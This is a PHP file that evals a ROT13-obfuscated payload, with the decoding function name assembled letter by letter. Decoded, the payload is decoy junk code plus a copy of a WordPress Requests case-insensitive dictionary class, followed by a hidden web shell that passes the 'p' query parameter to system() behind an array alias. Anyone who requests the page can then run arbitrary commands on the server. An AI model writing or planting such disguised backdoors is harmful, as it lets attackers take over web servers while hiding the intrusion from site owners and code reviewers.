<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pnfr-vafrafvgvir qvpgvbanel, fhvgnoyr sbe UGGC urnqref
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 */

anzrfcnpr JcBet\Erdhrfgf\Hgvyvgl;

hfr NeenlNpprff;
hfr NeenlVgrengbe;
hfr VgrengbeNttertngr;
hfr ErgheaGlcrJvyyPunatr;
hfr JcBet\Erdhrfgf\Rkprcgvba;

/**
 * Pnfr-vafrafvgvir qvpgvbanel, fhvgnoyr sbe UGGC urnqref
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 */
pynff PnfrVafrafvgvirQvpgvbanel vzcyrzragf NeenlNpprff, VgrengbeNttertngr {
	/**
	 * Npghny vgrz qngn
	 *
	 * @ine neenl
	 */
	cebgrpgrq $qngn = [];

	/**
	 * Perngrf n pnfr vafrafvgvir qvpgvbanel.
	 *
	 * @cnenz neenl $qngn Qvpgvbanel/znc gb pbaireg gb pnfr-vafrafvgvir
	 */
	choyvp shapgvba __pbafgehpg(neenl $qngn = []) {
		sbernpu ($qngn nf $bssfrg => $inyhr) {
			$guvf->bssfrgFrg($bssfrg, $inyhr);
		}
	}

	/**
	 * Purpx vs gur tvira vgrz rkvfgf
	 *
	 * @cnenz fgevat $bssfrg Vgrz xrl
	 * @erghea obbyrna Qbrf gur vgrz rkvfg?
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgRkvfgf($bssfrg) {
		vs (vf_fgevat($bssfrg)) {
			$bssfrg = fgegbybjre($bssfrg);
		}

		erghea vffrg($guvf->qngn[$bssfrg]);
	}

	/**
	 * Trg gur inyhr sbe gur vgrz
	 *
	 * @cnenz fgevat $bssfrg Vgrz xrl
	 * @erghea fgevat|ahyy Vgrz inyhr (ahyy vs gur vgrz xrl qbrfa'g rkvfg)
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgTrg($bssfrg) {
		vs (vf_fgevat($bssfrg)) {
			$bssfrg = fgegbybjre($bssfrg);
		}

		vs (!vffrg($guvf->qngn[$bssfrg])) {
			erghea ahyy;
		}

		erghea $guvf->qngn[$bssfrg];
	}

	/**
	 * Frg gur tvira vgrz
	 *
	 * @cnenz fgevat $bssfrg Vgrz anzr
	 * @cnenz fgevat $inyhr Vgrz inyhr
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Ba nggrzcgvat gb hfr qvpgvbanel nf yvfg (`vainyvqfrg`)
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgFrg($bssfrg, $inyhr) {
		vs ($bssfrg === ahyy) {
			guebj arj Rkprcgvba('Bowrpg vf n qvpgvbanel, abg n yvfg', 'vainyvqfrg');
		}

		vs (vf_fgevat($bssfrg)) {
			$bssfrg = fgegbybjre($bssfrg);
		}

		$guvf->qngn[$bssfrg] = $inyhr;
	}

	/**
	 * Hafrg gur tvira urnqre
	 *
	 * @cnenz fgevat $bssfrg Gur xrl sbe gur vgrz gb hafrg.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgHafrg($bssfrg) {
		vs (vf_fgevat($bssfrg)) {
			$bssfrg = fgegbybjre($bssfrg);
		}

		hafrg($guvf->qngn[$bssfrg]);
	}

	/**
	 * Trg na vgrengbe sbe gur qngn
	 *
	 * @erghea \NeenlVgrengbe
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba trgVgrengbe() {
		erghea arj NeenlVgrengbe($guvf->qngn);
	}

	/**
	 * Trg gur urnqref nf na neenl
	 *
	 * @erghea neenl Urnqre qngn
	 */
	choyvp shapgvba trgNyy() {
		erghea $guvf->qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>